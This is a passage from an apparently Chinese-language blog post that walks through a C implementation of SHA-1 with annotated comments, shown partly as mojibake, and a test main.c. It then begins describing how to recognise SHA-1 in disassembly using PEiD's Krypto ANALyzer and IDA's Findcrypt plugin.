class="line"><span class="type">unsigned</span> <span class="type">long</span> l[<span class="number">16</span>];</span><br><span class="line">&#125; CHAR64LONG16;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rol(value, bits) (((value) <span class="string">&lt;&lt; (bits)) | ((value) &gt;</span>&gt; (32 - (bits))))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*   blk0()   and   blk()   perform   the   initial   expand.   */</span></span><br><span class="line"><span class="comment">/*   I   got   the   idea   of   expanding   during   the   round   function   from   SSLeay   */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> LITTLE_ENDIAN</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> blk0(i) (block-&gt;l[i] = (rol(block-&gt;l[i], 24) &amp; 0xFF00FF00) | (rol(block-&gt;l[i], 8) &amp; 0x00FF00FF))</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> blk0(i) block-&gt;l[i]</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> blk(i) (block-&gt;l[i &amp; 15] = rol(block-&gt;l[(i + 13) &amp; 15] ^ block-&gt;l[(i + 8) &amp; 15] ^ block-&gt;l[(i + 2) &amp; 15] ^ block-&gt;l[i &amp; 15], 1))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*   (R0+R1),   R2,   R3,   R4   are   the   different   operations   used   in   SHA1   */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R0(v, w, x, y, z, i)                                     \</span></span><br><span class="line"><span class="meta">z += ((w &amp; (x ^ y)) ^ y) + blk0(i) + 0x5A827999 + rol(v, 5); \</span></span><br><span class="line"><span class="meta">w = rol(w, 30);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R1(v, w, x, y, z, i)                                    \</span></span><br><span class="line"><span class="meta">z += ((w &amp; (x ^ y)) ^ y) + blk(i) + 0x5A827999 + rol(v, 5); \</span></span><br><span class="line"><span class="meta">w = rol(w, 30);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R2(v, w, x, y, z, i)                            \</span></span><br><span class="line"><span class="meta">z += (w ^ x ^ y) + blk(i) + 0x6ED9EBA1 + rol(v, 5); \</span></span><br><span class="line"><span class="meta">w = rol(w, 30);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R3(v, w, x, y, z, i)                                          \</span></span><br><span class="line"><span class="meta">z += (((w | x) &amp; y) | (w &amp; x)) + blk(i) + 0x8F1BBCDC + rol(v, 5); \</span></span><br><span class="line"><span class="meta">w = rol(w, 30);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R4(v, w, x, y, z, i)                            \</span></span><br><span class="line"><span class="meta">z += (w ^ x ^ y) + blk(i) + 0xCA62C1D6 + rol(v, 5); \</span></span><br><span class="line"><span class="meta">w = rol(w, 30);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">SHA1Transform</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> state[<span class="number">5</span>], <span class="type">unsigned</span> <span class="type">char</span> buffer[<span class="number">64</span>])</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*   Hash   a   single   512-bit   block.   This   is   the   core   of   the   algorithm.   */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">SHA1Transform</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> state[<span class="number">5</span>], <span class="type">unsigned</span> <span class="type">char</span> buffer[<span class="number">64</span>])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> a, b, c, d, e;</span><br><span class="line">CHAR64LONG16 *block;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHA1HANDSOFF</span></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> workspace[<span class="number">64</span>];</span><br><span class="line">block = (CHAR64LONG16 *)workspace;</span><br><span class="line"><span class="built_in">memcpy</span>(block, buffer, <span class="number">64</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">block = (CHAR64LONG16 *)buffer;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*   Copy   context-&gt; state[]   to   working   vars   */</span></span><br><span class="line">a = state[<span class="number">0</span>];</span><br><span class="line">b = state[<span class="number">1</span>];</span><br><span class="line">c = state[<span class="number">2</span>];</span><br><span class="line">d = state[<span class="number">3</span>];</span><br><span class="line">e = state[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* å®Œæˆçš„å°±æ˜¯RFCæ–‡æ¡£ä¸­çš„H0ï½H4èµ‹å€¼ç»™ABCDEçš„æ“ä½œã€‚æ¥ä¸‹æ¥å°±æ˜¯80è½®è¿ç®—çš„ä»£ç ã€‚æ¯20è½®ä¸ºä¸€ç»„ï¼Œå…±åˆ†å››ç»„ */</span></span><br><span class="line"><span class="comment">/* ç¬¬ä¸€ç»„æ¯”è¾ƒç‰¹æ®Šï¼Œä½¿ç”¨äº†R0å’ŒR1ä¸¤ä¸ªå®å‡½æ•°ï¼Œå…¶åŸå› å‰é¢å·²ç»ä»‹ç»äº†ã€‚å› ä¸ºç¬¬0~15è½®è¿ç®—å’Œ16~79è½®è¿ç®—çš„æ—¶å€™æ¶ˆæ¯å—M(i)å’Œå­—å—W(i)çš„è½¬æ¢æ˜¯ä¸ä¸€æ ·çš„ã€‚åé¢çš„20~39è½®ï¼Œ40~59è½®ï¼Œ60~79è½®å°±æ˜¯ä¾æ¬¡ä½¿ç”¨çš„R2ï¼ŒR3ï¼ŒR4æ¥è¿ç®—äº† */</span></span><br><span class="line"><span class="comment">/*   4   rounds   of   20   operations   each.   Loop   unrolled.   */</span></span><br><span class="line">R0(a, b, c, d, e, <span class="number">0</span>);</span><br><span class="line">R0(e, a, b, c, d, <span class="number">1</span>);</span><br><span class="line">R0(d, e, a, b, c, <span class="number">2</span>);</span><br><span class="line">R0(c, d, e, a, b, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">R0(b, c, d, e, a, <span class="number">4</span>);</span><br><span class="line">R0(a, b, c, d, e, <span class="number">5</span>);</span><br><span class="line">R0(e, a, b, c, d, <span class="number">6</span>);</span><br><span class="line">R0(d, e, a, b, c, <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">R0(c, d, e, a, b, <span class="number">8</span>);</span><br><span class="line">R0(b, c, d, e, a, <span class="number">9</span>);</span><br><span class="line">R0(a, b, c, d, e, <span class="number">10</span>);</span><br><span class="line">R0(e, a, b, c, d, <span class="number">11</span>);</span><br><span class="line"></span><br><span class="line">R0(d, e, a, b, c, <span class="number">12</span>);</span><br><span class="line">R0(c, d, e, a, b, <span class="number">13</span>);</span><br><span class="line">R0(b, c, d, e, a, <span class="number">14</span>);</span><br><span class="line">R0(a, b, c, d, e, <span class="number">15</span>);</span><br><span class="line"></span><br><span class="line">R1(e, a, b, c, d, <span class="number">16</span>);</span><br><span class="line">R1(d, e, a, b, c, <span class="number">17</span>);</span><br><span class="line">R1(c, d, e, a, b, <span class="number">18</span>);</span><br><span class="line">R1(b, c, d, e, a, <span class="number">19</span>);</span><br><span class="line"></span><br><span class="line">R2(a, b, c, d, e, <span class="number">20</span>);</span><br><span class="line">R2(e, a, b, c, d, <span class="number">21</span>);</span><br><span class="line">R2(d, e, a, b, c, <span class="number">22</span>);</span><br><span class="line">R2(c, d, e, a, b, <span class="number">23</span>);</span><br><span class="line"></span><br><span class="line">R2(b, c, d, e, a, <span class="number">24</span>);</span><br><span class="line">R2(a, b, c, d, e, <span class="number">25</span>);</span><br><span class="line">R2(e, a, b, c, d, <span class="number">26</span>);</span><br><span class="line">R2(d, e, a, b, c, <span class="number">27</span>);</span><br><span class="line"></span><br><span class="line">R2(c, d, e, a, b, <span class="number">28</span>);</span><br><span class="line">R2(b, c, d, e, a, <span class="number">29</span>);</span><br><span class="line">R2(a, b, c, d, e, <span class="number">30</span>);</span><br><span class="line">R2(e, a, b, c, d, <span class="number">31</span>);</span><br><span class="line"></span><br><span class="line">R2(d, e, a, b, c, <span class="number">32</span>);</span><br><span class="line">R2(c, d, e, a, b, <span class="number">33</span>);</span><br><span class="line">R2(b, c, d, e, a, <span class="number">34</span>);</span><br><span class="line">R2(a, b, c, d, e, <span class="number">35</span>);</span><br><span class="line"></span><br><span class="line">R2(e, a, b, c, d, <span class="number">36</span>);</span><br><span class="line">R2(d, e, a, b, c, <span class="number">37</span>);</span><br><span class="line">R2(c, d, e, a, b, <span class="number">38</span>);</span><br><span class="line">R2(b, c, d, e, a, <span class="number">39</span>);</span><br><span class="line"></span><br><span class="line">R3(a, b, c, d, e, <span class="number">40</span>);</span><br><span class="line">R3(e, a, b, c, d, <span class="number">41</span>);</span><br><span class="line">R3(d, e, a, b, c, <span class="number">42</span>);</span><br><span class="line">R3(c, d, e, a, b, <span class="number">43</span>);</span><br><span class="line"></span><br><span class="line">R3(b, c, d, e, a, <span class="number">44</span>);</span><br><span class="line">R3(a, b, c, d, e, <span class="number">45</span>);</span><br><span class="line">R3(e, a, b, c, d, <span class="number">46</span>);</span><br><span class="line">R3(d, e, a, b, c, <span class="number">47</span>);</span><br><span class="line"></span><br><span class="line">R3(c, d, e, a, b, <span class="number">48</span>);</span><br><span class="line">R3(b, c, d, e, a, <span class="number">49</span>);</span><br><span class="line">R3(a, b, c, d, e, <span class="number">50</span>);</span><br><span class="line">R3(e, a, b, c, d, <span class="number">51</span>);</span><br><span class="line"></span><br><span class="line">R3(d, e, a, b, c, <span class="number">52</span>);</span><br><span class="line">R3(c, d, e, a, b, <span class="number">53</span>);</span><br><span class="line">R3(b, c, d, e, a, <span class="number">54</span>);</span><br><span class="line">R3(a, b, c, d, e, <span class="number">55</span>);</span><br><span class="line"></span><br><span class="line">R3(e, a, b, c, d, <span class="number">56</span>);</span><br><span class="line">R3(d, e, a, b, c, <span class="number">57</span>);</span><br><span class="line">R3(c, d, e, a, b, <span class="number">58</span>);</span><br><span class="line">R3(b, c, d, e, a, <span class="number">59</span>);</span><br><span class="line"></span><br><span class="line">R4(a, b, c, d, e, <span class="number">60</span>);</span><br><span class="line">R4(e, a, b, c, d, <span class="number">61</span>);</span><br><span class="line">R4(d, e, a, b, c, <span class="number">62</span>);</span><br><span class="line">R4(c, d, e, a, b, <span class="number">63</span>);</span><br><span class="line"></span><br><span class="line">R4(b, c, d, e, a, <span class="number">64</span>);</span><br><span class="line">R4(a, b, c, d, e, <span class="number">65</span>);</span><br><span class="line">R4(e, a, b, c, d, <span class="number">66</span>);</span><br><span class="line">R4(d, e, a, b, c, <span class="number">67</span>);</span><br><span class="line"></span><br><span class="line">R4(c, d, e, a, b, <span class="number">68</span>);</span><br><span class="line">R4(b, c, d, e, a, <span class="number">69</span>);</span><br><span class="line">R4(a, b, c, d, e, <span class="number">70</span>);</span><br><span class="line">R4(e, a, b, c, d, <span class="number">71</span>);</span><br><span class="line"></span><br><span class="line">R4(d, e, a, b, c, <span class="number">72</span>);</span><br><span class="line">R4(c, d, e, a, b, <span class="number">73</span>);</span><br><span class="line">R4(b, c, d, e, a, <span class="number">74</span>);</span><br><span class="line">R4(a, b, c, d, e, <span class="number">75</span>);</span><br><span class="line"></span><br><span class="line">R4(e, a, b, c, d, <span class="number">76</span>);</span><br><span class="line">R4(d, e, a, b, c, <span class="number">77</span>);</span><br><span class="line">R4(c, d, e, a, b, <span class="number">78</span>);</span><br><span class="line">R4(b, c, d, e, a, <span class="number">79</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* å®Œæˆçš„å°±æ˜¯æ›´æ–°ç¼“å†²åŒºH0ï½H4çš„å†…å®¹ã€‚ç„¶åæŠŠaï½eæ¸…ç©ºä¸º0 */</span></span><br><span class="line"><span class="comment">/*   Add   the   working   vars   back   into   context.state[]   */</span></span><br><span class="line">state[<span class="number">0</span>] += a;</span><br><span class="line">state[<span class="number">1</span>] += b;</span><br><span class="line">state[<span class="number">2</span>] += c;</span><br><span class="line">state[<span class="number">3</span>] += d;</span><br><span class="line">state[<span class="number">4</span>] += e;</span><br><span class="line"><span class="comment">/*   Wipe   variables   */</span></span><br><span class="line">a = b = c = d = e = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*   SHA1Init   -   Initialize   new   context   */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SHA1Init</span><span class="params">(SHA1_CTX *context)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/*   SHA1   initialization   constants   */</span></span><br><span class="line">context-&gt;state[<span class="number">0</span>] = <span class="number">0x67452301</span>;</span><br><span class="line"></span><br><span class="line">context-&gt;state[<span class="number">1</span>] = <span class="number">0xEFCDAB89</span>;</span><br><span class="line"></span><br><span class="line">context-&gt;state[<span class="number">2</span>] = <span class="number">0x98BADCFE</span>;</span><br><span class="line"></span><br><span class="line">context-&gt;state[<span class="number">3</span>] = <span class="number">0x10325476</span>;</span><br><span class="line"></span><br><span class="line">context-&gt;state[<span class="number">4</span>] = <span class="number">0xC3D2E1F0</span>;</span><br><span class="line"></span><br><span class="line">context-&gt;count[<span class="number">0</span>] = context-&gt;count[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*   Run   your   data   through   this.   */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SHA1Update</span><span class="params">(SHA1_CTX *context, <span class="type">unsigned</span> <span class="type">char</span> *data, <span class="type">unsigned</span> <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i, j;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*   j&gt;&gt;3è·å¾—çš„å°±æ˜¯å­—èŠ‚æ•°ï¼Œj = (j &gt;&gt; 3) &amp; 63å¾—åˆ°çš„å°±æ˜¯ä½6ä½çš„å€¼ï¼Œä¹Ÿå°±æ˜¯ä»£è¡¨64ä¸ªå­—èŠ‚ï¼ˆ512ä½ï¼‰é•¿åº¦çš„æ¶ˆæ¯ã€‚ï¼Œå› ä¸ºæˆ‘ä»¬æ¯æ¬¡è¿›è¡Œè®¡ç®—éƒ½æ˜¯å¤„ç†512ä½çš„æ¶ˆæ¯æ•°æ®ã€‚ */</span></span><br><span class="line">j = (context-&gt;count[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">63</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* context-&gt;count[ ]å­˜å‚¨çš„æ˜¯æ¶ˆæ¯çš„é•¿åº¦ï¼Œè¶…å‡ºcontext-&gt;count[0]çš„å­˜å‚¨èŒƒå›´çš„éƒ¨åˆ†å­˜å‚¨åœ¨context-&gt;count[1]ä¸­ã€‚len&lt;&lt;3å°±æ˜¯len*8çš„æ„æ€ï¼Œå› ä¸ºlençš„å•ä½æ˜¯å­—èŠ‚ï¼Œè€Œcontext-&gt;count[ ]å­˜å‚¨çš„é•¿åº¦çš„å•ä½æ˜¯ä½ï¼Œæ‰€ä»¥è¦ä¹˜ä»¥8ã€‚ if ((context-&gt;count[0] += len &lt;&lt; 3) &lt; j) çš„æ„æ€å°±æ˜¯è¯´å¦‚æœåŠ ä¸Šlen*8ä¸ªä½ï¼Œcontext-&gt;count[0]æº¢å‡ºäº†ï¼Œé‚£ä¹ˆå°±è¦ï¼šcontext-&gt;count[1]++ï¼›è¿›ä½ã€‚</span></span><br><span class="line"><span class="comment">len&lt;&lt;3çš„å•ä½æ˜¯ä½ï¼Œlen&gt;&gt;29ï¼ˆlen&lt;&lt;3 &gt;&gt;32ï¼‰è¡¨ç¤ºçš„å°±æ˜¯lenä¸­è¦å­˜å‚¨åœ¨context-&gt;count[1]ä¸­çš„éƒ¨åˆ†ã€‚ */</span></span><br><span class="line"><span class="keyword">if</span> ((context-&gt;count[<span class="number">0</span>] += len &lt;&lt; <span class="number">3</span>) &lt; (len &lt;&lt; <span class="number">3</span>))</span><br><span class="line">context-&gt;count[<span class="number">1</span>]++;</span><br><span class="line"></span><br><span class="line">context-&gt;count[<span class="number">1</span>] += (len &gt;&gt; <span class="number">29</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* å¦‚æœj+lençš„é•¿åº¦å¤§äº63ä¸ªå­—èŠ‚ï¼Œå°±åˆ†å¼€å¤„ç†ï¼Œæ¯64ä¸ªå­—èŠ‚å¤„ç†ä¸€æ¬¡ï¼Œç„¶åå†å¤„ç†åé¢çš„64ä¸ªå­—èŠ‚ï¼Œé‡å¤è¿™ä¸ªè¿‡ç¨‹ï¼›å¦åˆ™å°±ç›´æ¥å°†æ•°æ®é™„åŠ åˆ°bufferæœ«å°¾ */</span></span><br><span class="line"><span class="keyword">if</span> ((j + len) &gt; <span class="number">63</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;context-&gt;buffer[j], data, (i = <span class="number">64</span> - j));<span class="comment">/* i=64-jï¼Œç„¶åä»dataä¸­å¤åˆ¶iä¸ªå­—èŠ‚çš„æ•°æ®é™„åŠ åˆ°context-&gt;buffer[j]æœ«å°¾ï¼Œä¹Ÿå°±æ˜¯è¯´ç»™bufferå‡‘æˆäº†64ä¸ªå­—èŠ‚ */</span></span><br><span class="line">SHA1Transform(context-&gt;state, context-&gt;buffer);<span class="comment">/* æ‰§è¡ŒSHA1Transform()æ¥å¼€å§‹ä¸€æ¬¡æ¶ˆæ¯æ‘˜è¦çš„è®¡ç®— */</span></span><br><span class="line"><span class="comment">/* æ¯64ä¸ªå­—èŠ‚å¤„ç†ä¸€æ¬¡ */</span></span><br><span class="line"><span class="keyword">for</span> (; i + <span class="number">63</span> &lt; len; i += <span class="number">64</span>)</span><br><span class="line">&#123;</span><br><span class="line">SHA1Transform(context-&gt;state, &amp;data[i]);</span><br><span class="line">&#125;</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* å¦‚æœå‰é¢çš„ifä¸æˆç«‹ï¼Œé‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´åŸå§‹æ•°æ®context-&gt;bufferåŠ ä¸Šæ–°çš„æ•°æ®dataçš„é•¿åº¦è¿˜ä¸è¶³ä»¥å‡‘æˆ64ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥ç›´æ¥é™„åŠ ä¸Šdataå°±è¡Œäº†ã€‚ç›¸å½“äºï¼šmemcpy(&amp;context-&gt;buffer[j], &amp;data[i], 0);</span></span><br><span class="line"><span class="comment">å¦‚æœå‰é¢çš„ifæˆç«‹ï¼Œé‚£ä¹ˆjæ˜¯ç­‰äº0çš„ï¼Œè€Œ i æ‰€æŒ‡å‘çš„åç§»ä½ç½®æ˜¯ (â”” len/64â”˜Ã—64,len)ä¹‹é—´ã€‚ â””   â”˜è¡¨ç¤ºå‘ä¸‹å–æ•´ã€‚*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(&amp;context-&gt;buffer[j], &amp;data[i], len - i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*   Add   padding   and   return   the   message   digest.   */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SHA1Final</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> digest[<span class="number">20</span>], SHA1_CTX *context)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> i, j;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> finalcount[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">finalcount[i] = (<span class="type">unsigned</span> <span class="type">char</span>)((context-&gt;count[(i &gt;= <span class="number">4</span> ? <span class="number">0</span> : <span class="number">1</span>)]</span><br><span class="line"> &gt;&gt; ((<span class="number">3</span> - (i &amp; <span class="number">3</span>)) * <span class="number">8</span>)) &amp;</span><br><span class="line"><span class="number">255</span>); <span class="comment">/*   Endian   independent   */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* å¡«å……çš„æ—¶å€™æ˜¯ä»¥å­—èŠ‚ä¸ºå•ä½çš„ï¼Œæœ€å°‘1ä¸ªå­—èŠ‚ï¼Œæœ€å¤š64ä¸ªå­—èŠ‚ã€‚å¹¶ä¸”ç¬¬ä¸€ä½è¦å¡«å……1ï¼Œåé¢éƒ½å¡«å……0ã€‚æ‰€ä»¥æ‹¿åˆ°ä¸€ä¸ªæ¶ˆæ¯æˆ‘ä»¬é¦–å…ˆè¦ç»™ä»–å¡«å……ä¸€ä¸ªå­—èŠ‚çš„10 000 000.SHA1Update() å‡½æ•°å°±æ˜¯å®Œæˆçš„æ•°æ®å¡«å……ï¼ˆé™„åŠ ï¼‰æ“ä½œ */</span></span><br><span class="line">SHA1Update(context, (<span class="type">unsigned</span> <span class="type">char</span> *)<span class="string">&quot;\200 &quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* å¾ªç¯æµ‹è¯•æ•°æ®æ¨¡512æ˜¯å¦ä¸448åŒä½™ã€‚ä¸æ»¡è¶³æ¡ä»¶å°±å¡«å……å…¨ä¸€ä¸ªå­—èŠ‚0ã€‚ */</span></span><br><span class="line"><span class="comment">/* ä½¿ç”¨ while ((context-&gt;count[0] &amp; 511) != 448) è²Œä¼¼æ›´åˆé€‚ã€‚ä½†æ˜¯ï¼Œ504åä¸‰ä½å…¨0,511åä¸‰ä½å…¨1ã€‚context-&gt;countä¸­å­˜å‚¨çš„æ˜¯æ¶ˆæ¯çš„é•¿åº¦ï¼Œå®ƒçš„å•ä½æ˜¯ï¼šä½ã€‚å‰é¢æˆ‘ä»¬æåˆ°äº†æˆ‘ä»¬çš„æ•°æ®æ˜¯ä»¥å­—èŠ‚æ¥å­˜å‚¨çš„ï¼Œæ‰€ä»¥context-&gt;count[ ]ä¸­çš„æ•°æ®è‚¯å®šæ˜¯8ä¸ªå€æ•°ï¼Œæ‰€ä»¥åä¸‰ä½è‚¯å®šæ˜¯000ã€‚æ‰€ä»¥ä¸ç®¡æ˜¯000&amp;000ï¼Œè¿˜æ˜¯000&amp;111å…¶ç»“æœéƒ½æ˜¯0ã€‚ */</span></span><br><span class="line"><span class="keyword">while</span> ((context-&gt;count[<span class="number">0</span>] &amp; <span class="number">504</span>) != <span class="number">448</span>)</span><br><span class="line">&#123;</span><br><span class="line">SHA1Update(context, (<span class="type">unsigned</span> <span class="type">char</span> *)<span class="string">&quot;\0 &quot;</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* è¿™å°†è§¦å‘SHA1Transform()å‡½æ•°çš„è°ƒç”¨ï¼Œè¯¥å‡½æ•°çš„åŠŸèƒ½å°±æ˜¯è¿›è¡Œè¿ç®—ï¼Œå¾—å‡º160ä½çš„æ¶ˆæ¯æ‘˜è¦ï¼ˆmessage digestï¼‰å¹¶å‚¨å­˜åœ¨context-state[ ]ä¸­ï¼Œå®ƒæ˜¯æ•´ä¸ªSHA-1ç®—æ³•çš„æ ¸å¿ƒ */</span></span><br><span class="line">SHA1Update(context, finalcount, <span class="number">8</span>); <span class="comment">/*   Should   cause   a   SHA1Transform()   */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* æœ€åçš„è¿™æ­¥è½¬æ¢å°†æ¶ˆæ¯æ‘˜è¦è½¬æ¢æˆå•å­—èŠ‚åºåˆ—ã€‚ç”¨ä»£ç æ¥è§£é‡Šå°±æ˜¯ï¼šå°†context-state[5]ä¸­å‚¨å­˜çš„20ä¸ªå­—èŠ‚ï¼ˆ5Ã—4å­—èŠ‚ï¼‰çš„æ¶ˆæ¯æ‘˜è¦å–å‡ºï¼Œå°†å…¶å­˜å‚¨åœ¨20ä¸ªå•å­—èŠ‚çš„æ•°ç»„digestä¸­ã€‚å¹¶ä¸”æŒ‰å¤§ç«¯åºå­˜å‚¨ï¼ˆä¸ä¹‹å‰åˆ†æcontext-&gt;count[ ]åˆ°finalcount[ ]è½¬æ¢çš„æ€è·¯ç›¸åŒï¼‰ */</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">digest[i] = (<span class="type">unsigned</span> <span class="type">char</span>)</span><br><span class="line"></span><br><span class="line">((context-&gt;state[i &gt;&gt; <span class="number">2</span>] &gt;&gt; ((<span class="number">3</span> - (i &amp; <span class="number">3</span>)) * <span class="number">8</span>)) &amp; <span class="number">255</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*   Wipe   variables   */</span></span><br><span class="line">i = j = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(context-&gt;buffer, <span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line"><span class="built_in">memset</span>(context-&gt;state, <span class="number">0</span>, <span class="number">20</span>);</span><br><span class="line"><span class="built_in">memset</span>(context-&gt;count, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memset</span>(&amp;finalcount, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHA1HANDSOFF <span class="comment">/*   make   SHA1Transform   overwrite   it &#x27;s   own   static   vars   */</span></span></span><br><span class="line">SHA1Transform(context-&gt;state, context-&gt;buffer);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sha1.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    SHA1_CTX ctx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> hash[<span class="number">20</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> abc[] = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    <span class="comment">/* è®¡ç®—å‰ï¼Œå…ˆåˆå§‹åŒ– */</span></span><br><span class="line">    SHA1Init(&amp;ctx);</span><br><span class="line">    <span class="comment">/* å¤šæ¬¡è°ƒç”¨ SHA1Update å¾ªç¯è®¡ç®—å¤šä¸ªåŒ…æ•°æ®ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰ */</span></span><br><span class="line">    SHA1Update(&amp;ctx, abc, <span class="built_in">strlen</span>(abc));</span><br><span class="line">    <span class="comment">/* æœ€åè°ƒç”¨ SHA1Final è·å–æœ€ç»ˆç»“æœ */</span></span><br><span class="line">    SHA1Final(hash, &amp;ctx);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%2.2x&quot;</span>, hash[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ä¸‰-æ±‡ç¼–åˆ†æè¯†åˆ«sha1ç®—æ³•"><a href="#ä¸‰-æ±‡ç¼–åˆ†æè¯†åˆ«sha1ç®—æ³•" class="headerlink" title="ä¸‰ æ±‡ç¼–åˆ†æè¯†åˆ«sha1ç®—æ³•"></a>ä¸‰ æ±‡ç¼–åˆ†æè¯†åˆ«sha1ç®—æ³•</h1><p>å‚è€ƒå¦‚ä¸‹æ–‡ç« ï¼š</p><p><a href="https://blog.csdn.net/abel_big_xu/article/details/115620883">é€†å‘åˆ†æä¸­çš„å¯†ç å­¦â€”SHA1_sha1é€†å‘-CSDNåšå®¢</a></p><hr><p>ä½¿ç”¨PEidå¸¦çš„Krypto ANALyzerè¿˜æ˜¯å¯ä»¥è¯†åˆ«åˆ°ç¨‹åºä½¿ç”¨äº†sha1</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171357388.png" alt="image-20240617135701343"> </p><p>ä½¿ç”¨ida proçš„æ’ä»¶Findcryptèƒ½å¤Ÿè¯†åˆ«åˆ°åˆå§‹åŒ–å¸¸æ•°ABCDEå’Œä¸»å¾ªç¯å¸¸æ•°K</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171357637.png" alt="image-20240617135734567"> </p><h2 id="1-ç®—æ³•è¯†åˆ«"><a href="#1-ç®—æ³•è¯†åˆ«" class="headerlink" title="1 ç®—æ³•è¯†åˆ«"></a>1 ç®—æ³•è¯†åˆ«</h2><p>mainå‡½æ•°ä¸»è¦åŒ…æ‹¬ä¸‹é¢3ä¸ªæ­¥éª¤ã€‚</p><ol><li>SHA1init</li><li>SHA1Update</li><li>SHA1Final</li></ol><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171358979.png" alt="image-20240617135830941"> </p><h3 